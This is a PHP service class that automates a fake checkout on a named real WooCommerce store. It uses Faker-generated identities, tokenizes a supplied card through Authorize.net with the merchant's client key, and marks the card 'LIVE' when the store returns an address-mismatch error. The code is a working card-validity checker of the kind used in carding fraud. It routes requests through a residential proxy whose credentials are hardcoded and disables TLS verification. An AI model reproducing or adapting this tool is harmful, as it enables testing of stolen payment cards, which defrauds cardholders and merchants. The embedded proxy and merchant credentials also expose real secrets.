<?php

namespace App\Services;

use App\Enums\Status;
use App\Objects\CardDto;
use App\Supports\CardValidate;
use App\Supports\Dom;
use Faker\Factory;
use Illuminate\Support\Str;
use GuzzleHttp\Client;
use GuzzleHttp\Cookie\CookieJar;
use GuzzleHttp\RequestOptions;
use IvoPetkov\HTML5DOMDocument;

class Avs
{
    use Dom;
    use CardValidate;

    protected Client $client;
    protected CookieJar $cookie;

    public function __construct(
        protected CardDto $card
    ) {
        $this->cookie = new CookieJar();
        $this->client = new Client([
            'cookies'   =>  $this->cookie,
            RequestOptions::VERIFY => false,
            RequestOptions::PROXY => 'http://lum-auth-token:LtMXmaXivnY3CdjUBVwDYEU5d6BYyRe7@pmgr-customer-c_1c5fc58f.zproxy.lum-superproxy.io:24002'
        ]);
    }

    public function __invoke()
    {
        $cart = $this->addItemToCard();
        $checkout = $this->checkout();

        return [
            'data'  =>  $this->card->toArray(),
            ...$checkout,
        ];
    }

    protected function getHiddenInputValues(string $html)
    {
        $hiddenInputs   = str($html)->matchAll('/<input type="hidden" name=".*" value=".*" \/>/');

        return $hiddenInputs   = collect($hiddenInputs)
            ->map(fn (string $htmlString) => $this->loadDom($htmlString))
            ->mapWithKeys(fn (HTML5DOMDocument $dom) => [
                $dom->querySelector('input')->getAttribute('name') => [
                    'name'  =>  $dom->querySelector('input')->getAttribute('name'),
                    'contents' => $dom->querySelector('input')->getAttribute('value')
                ]
            ])
            ->values()
            ->toArray();
    }

    protected function addItemToCard()
    {
        $product        = $this->client->get('https://www.equi-lete.com/product/mighty-lyte/')->getBody()->getContents();
        $hiddenInputs   = $this->getHiddenInputValues($product);
        $postFields = [
            ...$hiddenInputs,
            ['name'      => 'attribute_pa_product-size', 'contents'  =>  'single'],
            ['name'      => 'quantity', 'contents'  =>  '1']
        ];

        //
        $cart = $this->client->post('https://www.equi-lete.com/product/mighty-lyte/', [
            'multipart' => $postFields
        ])->getBody()->getContents();

        if (!str($cart)->contains('has been added')) {
            throw new \Error('Failed add item to card');
        }

        return $cart;
    }

    protected function checkout()
    {
        $faker = Factory::create('en_US');
        $firstName = $faker->firstName();
        $lastName = $faker->lastName();
        $streetAddress = $faker->streetAddress();
        $city = $faker->city();
        $state = $faker->stateAbbr();
        $postCode = $faker->postcode();

        $checkoutPageResponse = $this->client
            ->get('https://www.equi-lete.com/checkout/')
            ->getBody()
            ->getContents();

        $woocommerceCheckoutNonce = $this->woocommerceCheckoutNonce($checkoutPageResponse);
        $authorizeNonce = $this->authorize();
        $hiddenInputs = $this->getHiddenInputValues($checkoutPageResponse);
        $formatCardDate = $this->formatDate($this->card->month, $this->card->year);

        $postFields = [
            'billing_first_name' => $firstName,
            'billing_last_name' => $lastName,
            'billing_company' => '',
            'billing_country' => 'US',
            'billing_address_1' => $streetAddress,
            'billing_address_2' => '',
            'billing_city' => $city,
            'billing_state' => $state,
            'billing_postcode' => $postCode,
            'billing_phone' => str($faker->e164PhoneNumber())->replace('+', '')->toString(),
            'billing_email' => $faker->freeEmail(),
            'shipping_first_name' => $firstName,
            'shipping_last_name' => $lastName,
            'shipping_company' => '',
            'shipping_country' => 'US',
            'shipping_address_1' => $streetAddress,
            'shipping_address_2' => '',
            'shipping_city' => $city,
            'shipping_state' => $state,
            'shipping_postcode' => $postCode,
            'order_comments' => '',
            'payment_method' => 'authorize_net_aim',
            'wc-authorize-net-aim-expiry' => $formatCardDate->format('m') . ' / ' . $formatCardDate->format('y'),
            'wc-authorize-net-aim-payment-nonce' => $authorizeNonce,
            'wc-authorize-net-aim-payment-descriptor' => 'COMMON.ACCEPT.INAPP.PAYMENT',
            'wc-authorize-net-aim-card-type' => $this->card->type,
            'wc-authorize-net-aim-last-four' => substr($this->card->number, -4, 4),
            'terms' => 'on',
            'terms-field' => '1',
            'woocommerce-process-checkout-nonce' => $woocommerceCheckoutNonce,
            '_wp_http_referer' => '/?wc-ajax=update_order_review',
            ...$hiddenInputs
        ];

        $checkoutResponse = $this->client->post('https://www.equi-lete.com/?wc-ajax=checkout', [
            'form_params'   =>  $postFields
        ])->getBody()->getContents();

        $checkoutResponseJson = optional(json_decode($checkoutResponse));
        if (!$checkoutResponseJson) {
            throw new \Error('Cannot decode checkout response');
        }

        $checkoutResult = $checkoutResponseJson->result;
        $checkoutResultMessage = $checkoutResponseJson->messages;
        $checkoutResultMessage = str($checkoutResultMessage)->betweenFirst('<li>', '</li>')->trim()->replace(["\n", "\t", "\r"], "");

        if (!$checkoutResult) {
            throw new \Error('Cannot get checkout result code');
        }

        if ($checkoutResult === 'failure') {
            if (str($checkoutResultMessage)->contains('provided address does not match')) {
                return [
                    'result'    =>  Status::LIVE,
                ];
            }

            return [
                'result'    =>  Status::DIE,
                'reason'    =>  $checkoutResultMessage
            ];
        }

        return [
            'result'    =>  Status::ERROR,
        ];
    }

    protected function authorize()
    {
        $request = $this->client->post('https://api2.authorize.net/xml/v1/request.api', [
            'json'  =>  [
                "securePaymentContainerRequest" => [
                    "merchantAuthentication" => [
                        "name" => "4s4Z2dUmA",
                        "clientKey" => "5DbprU62fDm9GS4LdzgxQNsYA534PnsyK5e93jDma9bN4zvwL93ZA5NzK5AsZTqq"
                    ],
                    "data" => [
                        "type" => "TOKEN",
                        "id" => Str::uuid(),
                        "token" => [
                            "cardNumber" => $this->card->number,
                            "expirationDate" => $this->card->month . '' . $this->card->year,
                            "cardCode" => $this->card->securityCode
                        ]
                    ]
                ]
            ]
        ]);

        $response = $request->getBody()->getContents();
        $responseJson = json_decode($response);

        if (!$responseJson) {
            $response = json_encode($response);
            $response = str($response)->replace('\ufeff', '')->toString();
            $responseJson = json_decode(json_decode($response));
        }

        $resultCode = $responseJson->messages->resultCode;
        if (!$resultCode || $resultCode != 'Ok') {
            throw new \Error('Get authorize nonce failure. Code ' . $resultCode);
        }

        $authorizeNonce = $responseJson->opaqueData->dataValue;
        if (!$authorizeNonce) {
            throw new \Error('Cant get authorize nonce.');
        }

        return $authorizeNonce;
    }

    protected function woocommerceCheckoutNonce(string $html)
    {
        $dom = $this->loadDom($html);
        $inputElement = $dom->getElementById('woocommerce-process-checkout-nonce');

        return $inputElement->getAttribute('value');
    }
}
